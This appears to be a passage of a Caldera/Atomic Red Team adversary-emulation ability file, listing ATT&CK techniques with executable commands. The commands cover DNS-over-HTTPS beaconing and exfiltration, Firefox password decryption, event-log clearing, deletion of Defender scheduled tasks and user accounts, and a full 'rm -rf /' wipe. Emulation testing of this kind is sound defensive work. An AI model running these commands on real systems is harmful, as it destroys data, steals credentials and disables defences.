[{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Location PathToAtomicsFolder; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Protocol Tunneling", "ability_id": "a546abab3fca70dd49036e96d8e8dee3", "technique_id": "T1572", "tactic": "command-and-control", "requirements": [], "name": "DNS over HTTPS Long Domain Query", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Location PathToAtomicsFolder; .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Protocol Tunneling", "ability_id": "51e07e3ad45919d52901a7a06646ae91", "technique_id": "T1572", "tactic": "command-and-control", "requirements": [], "name": "DNS over HTTPS Regular Beaconing", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module $env:Temp\\dnsexfil.ps1; Invoke-DNSExfiltrator -i $env:Temp\\dnsexfil.ps1 -d target.example.com -p atomic -doh google -t 500 None", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol", "ability_id": "976ba17d4fcab66c2a917b81f54ab654", "technique_id": "T1048", "tactic": "exfiltration", "requirements": [], "name": "DNSExfiltration (doh)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/victim-gzip.txt.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/victim-gzip.txt.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "3f92476875c5ba5acad424dbf15bce4d", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Data Compressed - nix - gzip Single File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/data.tar.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/data.tar.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "03d30a66b8efe684a1711687dfbaa590", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Data Compressed - nix - tar Folder or File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/data.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ $(ls /var/log/{w,b}tmp | wc -l) > 0 ] && [ -x $(which zip) ] ; then : ; else (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip); echo Please set input_files argument to include files that exist; fi;  ;  zip $HOME/data.zip /var/log/{w,b}tmp", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/data.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(ls /var/log/{w,b}tmp | wc -l) > 0 ] && [ -x $(which zip) ] ; then : ; else (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip); echo Please set input_files argument to include files that exist; fi;  ;  zip $HOME/data.zip /var/log/{w,b}tmp", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "c6c8a02a5633bdc9f887b94140a95934", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Data Compressed - nix - zip", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item '$env:temp\\test.txt.gpg' -force -erroraction silentlycontinue | out-null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {invoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"$env:temp\\gpginstall.exe\"; cmd /c \"$env:temp\\gpginstall.exe\" /S};  ;  cmd /c 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' -c '$env:temp\\test.txt'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "f2bfc169fd341061b08d47ddc895ca59", "technique_id": "T1486", "tactic": "impact", "requirements": [], "name": "Data Encrypted with GPG4Win", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Encrypt data for exiltration\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -Rf /tmp/T1560"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg); fi;  ;  mkdir -p /tmp/T1560; cd /tmp/T1560; touch a b c d e f g; zip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*; echo \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip; ls -l /tmp/T1560", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -Rf /tmp/T1560"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg); fi;  ;  mkdir -p /tmp/T1560; cd /tmp/T1560; touch a b c d e f g; zip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*; echo \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip; ls -l /tmp/T1560", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "4f7a9fbe6ef84e7fb32a3e85b7762210", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Data Encrypted with zip and gpg symmetric", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Take a file/directory, split it into 5Mb chunks\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi;  ;  cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi;  ;  cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Transfer Size Limits", "ability_id": "bbb0df644aaeee17fa4c4ca0d3a8a29e", "technique_id": "T1030", "tactic": "exfiltration", "requirements": [], "name": "Data Transfer Size Limits", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deadman ability to delete agent file after termination.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Deadman - Delete agent file", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/encoded.dat ; rm /tmp/art.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/encoded.dat ; rm /tmp/art.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "86ab6d7ecc05b7dabc7699a9e6a0a173", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "Decode base64 Data into Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["9e2e6f_T1218.001.chm"], "parsers": [], "cleanup": ["del %temp%\\T1218.001.html >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "hh.exe -decompile %temp% 9e2e6f_T1218.001.chm", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "cee5c12d61e0f0e4f6614d23330f2384", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Decompile Local CHM File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$env:temp\\T1555.003Test8.txt\" -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; cmd /c $env:temp\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "86a1f874f775e156551e30fe039517d8", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Decrypt Mozilla Passwords with Firepwd.py", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "486d482ab75183d12a011b1adea22a4a", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete Filesystem - Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "2413b013bc82d152765e2ac34601a327", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete Prefetch File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "ability_id": "6fa417fb183d6c20a67e617c0249f04f", "technique_id": "T1070.001", "tactic": "defense-evasion", "requirements": [], "name": "Delete System Logs Using Clear-EventLog", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "b0026f9a57639c049490a43d623d7695", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete TeamViewer Log Files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user AtomicUser User2DeletePW! /add && net.exe user AtomicUser /delete", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "8429e707230a826e7213a51acd219a51", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Delete User - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the user account using the dscl utility.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["dscl . -create /Users/ARTUser; dscl . -create /Users/ARTUser UserShell /bin/bash; dscl . -create /Users/ARTUser UniqueID 503; dscl . -create /Users/ARTUser NFSHomeDirectory /Users/ARTUser; dscl . -passwd /Users/ARTUser ARTPassword"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dscl . -delete /Users/ARTUser", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "3c9dd1c2bfcf47711bbf9da13fe1d2f5", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Delete User via dscl utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes the user account using the sysadminctl utility.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sysadminctl -addUser ARTUserAccount -fullName \"ARTUser\" -password ARTPassword"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sysadminctl -deleteUser ARTUserAccount", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "8dad8d218b37622f814b11db23836b9a", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Delete User via sysadminctl utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f && schtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f && schtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f && schtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"  ( call ) ELSE ( schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ) &&   &&  IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "c29edb8de0232248355c1911983620b1", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Delete Windows Defender Scheduled Tasks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item -path $env:TEMP\\deleteme_T1551.004", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "04858322bc6cd08282f2ce96cab5ee7c", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete a single file - Windows PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "del /f %temp%\\deleteme_T1551.004", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "77d396b6c029a11722969cb578f591d3", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete a single file - Windows cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "36aa805044ab4f4d7f6f372a46c8bab2", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete an entire folder - Windows PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rmdir /s /q %temp%\\deleteme_T1551.004", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "02e52d5a90c23e35b321e471c78c7823", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Delete an entire folder - Windows cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo log erase --all; sudo log erase --ttl; sudo log erase --predicate 'subsystem == \"com.apple.appstore\"'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "53fc12696bbc0d92d0311e8b40858735", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Delete log files using built-in log utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n", "repeatable": false, "privilege": "", "buckets": 